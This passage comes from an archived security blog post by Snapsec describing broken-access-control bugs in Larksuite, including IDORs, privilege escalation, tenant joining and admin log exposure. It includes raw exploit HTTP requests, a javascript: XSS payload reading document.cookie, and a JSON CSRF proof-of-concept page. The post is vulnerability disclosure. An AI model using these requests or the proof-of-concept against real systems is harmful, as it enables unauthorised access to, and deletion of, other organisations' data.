+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span>  <span class="nn">/suite/admin/tenant/chatSetting</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">unzftv7n88.larksuite.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">[Value]</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span>
+<span class="na">credentials</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=UTF-8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">[Value]</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Spending a time with this <em>unusual behaviour</em> we found a few more <em>issues</em> on this feature. As an unprivileged user we were able to escalate our <em>privileges</em> and we identified various issues which are as <em>under</em>:</p>
+
+<ul>
+  <li>Creating new staff groups in the organization using this HTTP request</li>
+</ul>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/suite/admin/tenant/chat</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">unzftv7n88.larksuite.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">[Value]</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span>
+<span class="na">credentials</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=UTF-8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">[Value]</span>
+
+<span class="p">{</span><span class="nl">"employeeTypes"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">],</span><span class="nl">"chatName"</span><span class="p">:</span><span class="s2">"imranparrayx"</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<ul>
+  <li>Editing settings of various staff groups of Admin</li>
+</ul>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nf">PATCH</span> <span class="nn">/suite/admin/tenant/chat</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">unzftv7n88.larksuite.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">[Value]</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span>
+<span class="na">credentials</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=UTF-8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">[Value]</span>
+
+<span class="p">{</span><span class="nl">"employeeTypes"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">],</span><span class="nl">"ownerID"</span><span class="p">:</span><span class="s2">"6782777787976515850"</span><span class="p">,</span><span class="nl">"chatName"</span><span class="p">:</span><span class="s2">"Admins-Group"</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<ul>
+  <li>Deleting/Disabling staff group</li>
+</ul>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/suite/admin/tenant/dissolve_chat</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">unzftv7n88.larksuite.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">[Value]</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span>
+<span class="na">credentials</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=UTF-8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">[Value]</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<ul>
+  <li>Re Enabling All Staff Group</li>
+</ul>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/suite/admin/tenant/normalize_chat</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">unzftv7n88.larksuite.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">[Value]</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span>
+<span class="na">credentials</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=UTF-8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">[Value]</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>In general an unprivileged user was able to manage a staff department without having access on it.</p>
+
+<hr/>
+
+<h3 id="idor---access-to-anyones-tickets-of-helpdesk">[IDOR] - Access to anyone’s ticket’s of helpdesk</h3>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/rest/xxx2.png" alt="1"/></p>
+
+<p>In enterprise collaboration, employees often have questions and don’t know who to ask. Even they make lot of efforts and find someone who can answer the questions, they may not receive replies in time. To avoid such process, larksuite had a feature called designed called HelpDesk.</p>
+
+<p>Any department or individual in the enterprise can create and use Help Desk, and set auto Q&amp;As regarding their business. When employees have a question, they can quickly find the corresponding Help Desk by searching the question type, and the intelligent customer service will answer immediately. If the intelligent customer service can not resolve the employee’s questions, Help Desk will quickly call the corresponding agents to answer it. We found that this paticular functionality was vulnerable to an IDOR attack.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/saipan/v2/api/worksheet/get?worksheet_id=[target-id]</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">subdomain.larksuite.com </span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close Content-Length: 29 </span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>to execute the attack all we had to do is change the the <code class="language-plaintext highlighter-rouge">worksheet_id</code> to the victims <code class="language-plaintext highlighter-rouge">worksheet_id</code> and we were able to access the tickets and personal information of other users on Larksuite.</p>
+
+<hr/>
+
+<h4 id="viewer-is-able-to-download-previous-versions-of-a-file">Viewer is able to download previous versions of a file</h4>
+
+<p>As mentioned earlier <em>larksuite allows</em> users to share <em>files with others</em> .A file can have <em>multiple versions</em> and from documentation we <em>remember that previous versions should not be accessible</em> to the <em>viewers</em> of the file. But in this case we abused that <em>functionality and were able to download teh previous versions of the files</em> as viewers.</p>
+
+<p>While <em>browsing</em> a file as a user and at the same tiem analyzingteh requests via burp we <em>saw an</em> <code class="language-plaintext highlighter-rouge">http</code> request  which leaked the <em>current version id</em> of the <em>file</em> including the <em>previous versions id’s of file</em>.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/3/2.PNG" alt="1"/></p>
+
+<p>We also found another <code class="language-plaintext highlighter-rouge">http</code> POST request and in its body we <em>posted</em> the leaked <em>previous version id</em> and in the <em>response</em> it gave us variosu details of teh <em>previous version</em> alongwith the <em>download url of that file</em>.</p>
+
+<p>Request is as below:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span>  <span class="nn">/space/api/box/file/info/</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">internal-api-space.larksuite.com</span>
+<span class="na">x-command</span><span class="p">:</span> <span class="s">space.api.box.file.info</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+
+<span class="w">
+</span><span class="p">{</span><span class="nl">"version"</span><span class="p">:</span><span class="s2">"leaked_versionid"</span><span class="p">,</span><span class="nl">"caller"</span><span class="p">:</span><span class="s2">"explorer"</span><span class="p">,</span><span class="nl">"file_token"</span><span class="p">:</span><span class="s2">"ofcurrentfile"</span><span class="p">,</span><span class="nl">"option_params"</span><span class="p">:[</span><span class="s2">"preview_meta"</span><span class="p">]}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/3/1.PNG" alt="1"/></p>
+
+<p>Browsing this <em>url in browser</em> we were able to download all of the <em>previosu versions</em> of the file.</p>
+
+<hr/>
+
+<h4 id="user-without-permission-can-download-files-even-if-its-restricted">User without permission can download file’s even if it’s restricted.</h4>
+
+<p>In previous issue we mentioned that larksuite allowed users to <em>share files</em> and the <em>file access</em> was controlled by ceratin <em>permissions</em> which only <em>Admins of the file</em> can set.</p>
+
+<p>In this case <em>we shared our file</em> with a user and <em>restricted the download permissions</em> , iplying that the user with whom file is being shared will be unable to download (as seen download button is disabled) the <em>file</em> but can <em>only view it</em>.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/4/1.png" alt="1"/></p>
+
+<p>We were able to bypass this restriction simply by <em>sending this http request</em>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span>  <span class="nn">/space/api/box/stream/download/all/[file-id]/</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">internal-api-space.larksuite.com</span>
+<span class="na">x-command</span><span class="p">:</span> <span class="s">space.api.box.file.info</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>In the response of this request we got the <em>downlaod url of the file</em> and pasting this <em>url in the browser</em> , we were simply able to downlaod the <em>file irrespective of the permissions</em>.</p>
+
+<p>Download URL will look something like this:</p>
+
+<p>Url will look like <code class="language-plaintext highlighter-rouge">https://internal-api-space.larksuite.com/space/api/box/stream/download/all/[file-id]/</code></p>
+
+<hr/>
+
+<h4 id="dom-based-open-redirect-leads-to-xss-on-larksuitecom-using-back_uri-parameter">DOM based open redirect leads to XSS on larksuite.com using /?back_uri= parameter</h4>
+
+<p>DOM-based open redirection arises when a script writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain</p>
+
+<p>The interesting thing about the DOM based open redirection is that if an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/rest/xxx1.png" alt="1"/></p>
+
+<p>What we found in this issue is that “back_uri” parameter was vulnerable to DOM based Open Redirection, The logic behind this issue was very simple, When the user visited the following link <code class="language-plaintext highlighter-rouge">https://www.larksuite.com/create/?back_uri=javascript:alert(document.cookie)</code>, A <code class="language-plaintext highlighter-rouge">Go Back</code> Button was Displayed on his screen and the button was calling a JS function which was updating the <code class="language-plaintext highlighter-rouge">document.location.href</code> of the current page to the value set to the /?back_uri= parameter.</p>
+
+<p>Hence passing <code class="language-plaintext highlighter-rouge">javascript:alert('snapsec')</code> would have allowed attacker to escalate this Open redirection into an DOM based XSS.</p>
+
+<hr/>
+
+<h4 id="viewer-was-able-to-permanentaly-delete-bin-files-of-admin">Viewer was able to permanentaly delete bin files of Admin</h4>
+
+<p>This issue was also found in file systems of <em>larksuite</em>. In this case we were able to <em>permanently delete</em> files from the trashbin of <em>Admin</em>. Trash and permanent delete functions seemed to be <em>interesting</em> that too when access controls are adminstered.</p>
+
+<p>The <em>Admin</em> invited a user in his personal <em>directory</em>  with only <em>view permissions</em> and he <em>couldn’t delete or edit the files</em> in that directory.  The shared <em>folder</em> contained many <em>files and sub-folders</em>  and the <em>viewer could not delete or edit them</em>. Admin deleted the <em>shared folder</em> and this <em>folder alongwith its files</em> is moved into the <strong>trash bin of admin</strong> and the viewer has no access on it.</p>
+
+<p>Logically <em>viewers access from that folder</em> should be removed when it is <em>moved into admins trash bin</em>, but we noticed that <em>viewer was still able to get the files inside that folder</em>, via a <code class="language-plaintext highlighter-rouge">GET</code> request which materialized the  thought that <em>viewer still has access</em> on the <em>folder</em>. We tried to <em>perform other restricted</em> operations by sending <em>various http requests</em> but <em>no luck with that</em>. Then we <em>noticed that</em> there is a <em>delete permmanent</em> feature available <em>in the trash</em> we tried to twitch this.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/5/1.PNG" alt="1"/></p>
+
+<p>HTTP request we <em>analyzed</em> that was responsibel for <em>deleting permanentaly</em> a <em>folder looked something</em> like this:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/space/api/explorer/trash/delete/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">internal-api-space.larksuite.com</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
+<span class="na">Context</span><span class="p">:</span> <span class="s">request_id=jgjIhvCWfQu6-6905236920255643653;os=windows;app_version=1.0.3.3484;os_version=10;platform=web</span>
+<span class="na">X-CSRFToken</span><span class="p">:</span> <span class="s">d08f9dadd19d65cd1e913b0e7e62d2aa0b6a9775-1609669174</span>
+<span class="na">F-Version</span><span class="p">:</span> <span class="s">docs-12-30-1609316079670</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://q5b6qhp5uw.larksuite.com</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://q5b6qhp5uw.larksuite.com/</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">[Value]</span>
+
+token=123456
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We sent this request as a viewer  and using the <em>folder id</em>  of the <em>admisn folder</em> , we got <strong>200 ok</strong> and upon confirmation, the <em>folder was permanentaly deleted</em> from <strong>Admins trash</strong>.</p>
+
+<hr/>
+
+<h4 id="access-to-private-files-of-other-users-in-helpdesk-conversation">Access to private file’s of other users in helpdesk conversation.</h4>
+
+<p>Remember previously i mentioned helpdesk is a golden nugget of information in every stance and this time we were able to access the <em>private files</em> used in conversation with the <em>larksuite staff</em>.</p>
+
+<p>The conversations are meant to be <em>private</em> not public and <em>hence every message and file</em> was confidential. Larkhelpdesk was simply a <em>support portal</em> which i hope you have crossed anywhere.</p>
+
+<p>The clicking factor here was that we identified that they were saving the <em>files</em> on same domain of which <em>one member created a ticket</em>, a <em>file url</em> looked something like this:</p>
+
+<p><code class="language-plaintext highlighter-rouge">https://name.larksuite.com/saipan/v2/api/ticket/image?ticket_id=26678</code></p>
+
+<p>Since <em>created ticket ids</em>  were viewable by the <em>other teammates</em> and they can just copy the <em>file url</em> and paste it in their <em>browser</em> and <em>putting in the random file id</em>, in link if that file existe they were able to view that file. Eventhough it was private and not accessible by other users.</p>
+
+<hr/>
+
+<h4 id="sub-dept-user-can-add-users-to-main-department">Sub-Dept User Can Add User’s To Main Department</h4>
+
+<p>In larksuite an owner of the tenant can create sub-department’s for convenience and user management. It can only be done by the owner of the tenant. If a user is <em>added ina  subdepartment</em> he can only access that department and <em>he won’t be able to access</em> other departments of the organization or add <em>new users</em> in them.</p>
+
+<p>When adding a suer in a sub-department we observed the http request and it looks like this:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/suite/admin/employees/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">hackeron1.larksuite.com </span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close </span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">149 </span>
+
+{"mobile":"","customFields":{"C-6826729584252157957":""},"name":"test","departments":["department_id"],"email":"ooo@gmail.com","joinTime":"","isInvite":true}
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>With this <em>request the sub-department</em> group member can add the <em>member only in this sub deparment</em> but intercepting this <em>request</em> and <em>sending</em> <strong>departments</strong> key with empty value, we noticed that we got <strong>200 ok</strong> response and the new user was added in the main organization by a low privileged member.</p>
+
+<hr/>
+
+<h4 id="auto-approving-own-apps-from-a-lower-level-role-leading-to-mass-privilege-escalations">Auto approving own apps from a lower level role leading to mass privilege escalations</h4>
+
+<p>Larksuite allowed users with <em>specific permissions</em> to be invited in the team and one of such permissions was <strong>App management</strong>. In this case we abused this permission to <em>auto approve our own app</em>.</p>
+
+<p>Admins can add a user with <em>App management permission</em> on a specific <em>app</em> and once the <em>users create</em> an app, they will have to <em>submit it to admin</em> who will approve the <em>application</em>. After approval from the admin, that application wil be functional and the <em>api token</em> will get validated.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/rest/3.png" alt="1"/></p>
+
+<p>Since we know user couldn’t approve an app by himslef so noticed a request <em>that was responsible for approving the application</em>, it looked something like this:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nf">PUT</span> <span class="nn">/suite/admin/appcenter/app/[App-id]/auditWhiteList</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">larksuite1.larksuite.com </span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close Content-Length: 29 </span>
+
+{"audit_white_list_status":1}
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Sending this request from the <em>low privileged user</em> the response was <strong>200 OK</strong> and the app got approved by the attacker. Once the <em>app was auto approved</em>  the user can now use this <em>fully functional app</em>, he can add new members in this, he can also  delete departments via this app.</p>
+
+<p>For example let’s say an attacker has permissions of App management only he will create app withupdate permission and afterwards will approve this app himself(Bypassing check from admin) he will then use the token in api call’s to update any user’s contact information Similarly there are numerous permissions that can be attached with the app afterwards he will accept the given app himself and gets a token that will be used in almost all api call’s.Which will give him access to all the feature where only admin were allowed.</p>
+
+<hr/>
+
+<h4 id="attacker-can-join-any-tenant-on-larksuite-and-view-personal-fileschats">Attacker can join any tenant on larksuite and view personal files/chats.</h4>
+
+<p>We stepped on a new feature on one of the domains of larksuite  which is known as <strong>Test companies and user’s</strong>. This feature was basically introduced so that lark user’s can create sandbox tenants where they can test their app’s in a whole different environment but by bringing new feature we mean bringing new vulnerabilities this feature can be abused in such a way that user’s can get access to other user’s tenant without any interaction. The lark <em>admins or tenant admins</em> can add new memebers <em>in these tenants</em> for different testing <em>puproses</em>.</p>
+
+<p>An invitation request in a <em>tenant</em> when analyzed was as follows:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/sandbox/AddTestTenantMember</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">open.larksuite.com </span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">Content-Length: 73 </span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">XYZ</span>
+
+{"TestTenantID":"TENANT_ID","Email":"EMAIL"}
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Attacker <em>simply changed</em> the <em>TestTenantID</em> value (which was a random numeric id and forwarded the request and response was <strong>200 ok</strong>. The used email id was mailed that he has been invited in a tenant of someone else.</p>
+
+<p>Inside that <em>tenant attacker can access</em> the files, conversations and other sensitive information. Plus i also noticed that Larksuite internally uses the same platform in order to host their files for example on <strong>App.larksuite.com</strong> we have various app’s and their documentation is hosted on the larksuite itself if an attacker will join the team it means that the attacker would be able to get access to those official documentation, Chats and other teams belong to the Larksuite company.</p>
+
+<hr/>
+
+<h4 id="csrf-no-csrf-protection-against-sending-invitation-to-join-the-team">[CSRF] No Csrf protection against sending invitation to join the team.</h4>
+
+<p>We found a possible way through which anyone can perform a CSRF Attack and forge a request from admin’s browser to join the team, as the request doesn’t consists any sort of CSRF protection.</p>
+
+<p>The following request was used to Invite a new member to the Team and was vulnerable to a CSRF Attack</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/create/api/v2/invite</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.larksuite.com</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+
+{"mobiles":[],"emails":["imunissar786@gmail.com"]}
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>So we created a Quick POC to exploit the issue</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;title&gt;</span>JSON CSRF POC<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;center&gt;</span>
+<span class="nt">&lt;h1&gt;</span> JSON CSRF POC <span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://www.larksuite.com/create/api/v2/invite</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span><span class="p">,</span> <span class="na">headers</span><span class="p">:</span> <span class="p">{</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">text/plain</span><span class="dl">'</span><span class="p">},</span> <span class="na">body</span><span class="p">:</span> <span class="dl">'</span><span class="s1">{"mobiles":[],"emails":["attacker@gmail.com"]}</span><span class="dl">'</span><span class="p">});</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/center&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>So as soon as someone from the team who has access to Invite Team members functionality visited our poc.html, He would invite Us(attacker) to their orginisation on larksuite.</p>
+
+<hr/>
+<h4 id="low-privileged-user-is-able-to-access-the-admin-log">Low privileged user is able to access the Admin log</h4>
+
+<p>A permission in a larksuite permission set named as  <strong>internal risk control</strong> when assigned to any user he is able to view all the admin logs of the company.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/rest/2.png" alt="1"/></p>
+
+<p>Admin logs contains all the senstive information like recent changes made, Permission changes,  View newly added or removed users,  View newly created files and deleted files. It keeps record of all the recent activities in the organization. We found a user <em>without the above mentioned permission</em> was able to <em>access teh company logs</em> via broken authentication on mentioned api endpoint.</p>
+
+<p>The restriction was only <em>implemented on the UI but not on the pai request</em>, sending that request we were able to <em>fetch all logs of the organization</em> in burpsuite. The <code class="language-plaintext highlighter-rouge">http</code> request was as follows:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/suite/admin/logs/?count=30&amp;offset=0&amp;min_time=1586025000&amp;max_time=1649356199&amp;_t=1649312050201</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.0</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">Subdomain.larksuite.com</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">XYZ</span>
+<span class="na">Cookie</span><span class="p">:</span><span class="s">[Value]</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr/>
+
+<h4 id="viewing-comments-on-files-and-documents">Viewing comments on files and documents.</h4>
+
+<p>Lark file systems let users to share files and documents and collaborate on them. The collaborators on  on a file can post comments on the file as well. But the <em>unauthorized users</em> or the users with whom the <em>file is shared</em> via an external link can <em>only view the file and not post or view comments on it</em>. This is becasue tehy are external users on the <em>file/document</em> and not collaborators.</p>
+
+<p>Analyzing the <em>comment request</em> of a file, we found a <strong>GET request</strong>  returned us all comments in the response. The request was as following:
+<code class="language-plaintext highlighter-rouge">/space/api/message/get_message.v3/</code>. We tried to sedn this request from an <em>unauthorized role</em> and we got <strong>403</strong>.</p>
+
+<p>In an instance we changed the <em>v3 to v2</em> and we got all of the comments of the <em>file in a response</em>. This is how <em>another version of api</em> leaked the commenst to the attacker.</p>
+
+<h4 id="about-us">About us</h4>
+
+<p>Snapsec is a team of security experts specialized in providing pentesting and other security services to secure your online assets. We have a specialized testing methodology which ensures indepth testing of your business logic and other latest vulnerabilities.</p>
+
+<p>If you are looking for a team which values your security and ensures that you are fully secure against online security threats, feel free to get in touch with us #<a href="https://web.archive.org/web/20220716152713/mailto:support@snapsec.co">support@snapsec.co</a></p>
+
+            </div>
+
+            <!-- Rating -->
+            
+
+            <!-- Post Date -->
+            <p>
+            <small>
+                <span class="post-date"><time class="post-date" datetime="2022-07-04">04 Jul 2022</time></span>           
+                
+                </small>
+            </p>
+
+            <!-- Post Categories -->
+            <div class="after-post-cats">
+                <ul class="tags mb-4">
+                    
+                    
+                    <li>
+                        <a class="smoothscroll" href="/web/20220716152713/https://snapsec.co/blog/categories#article">article</a>
+                    </li>
+                    
+                    <li>
+                        <a class="smoothscroll" href="/web/20220716152713/https://snapsec.co/blog/categories#broken-access-control">broken-access-control</a>
+                    </li>
+                    
+                </ul>
+            </div>
+            <!-- End Categories -->
+
+            <!-- Post Tags -->
+            <div class="after-post-tags">
+                <ul class="tags">
+                    
+                    
+                </ul>
+            </div>
+            <!-- End Tags -->
+
+            <!-- Prev/Next -->
+            <div class="row PageNavigation d-flex justify-content-between font-weight-bold">
+            
+            <a class="prev d-block col-md-6" href="/web/20220716152713/https://snapsec.co/blog//Security-Explained-sqli/"> &laquo; Security Simplified - SQL Injection</a>
+            
+            
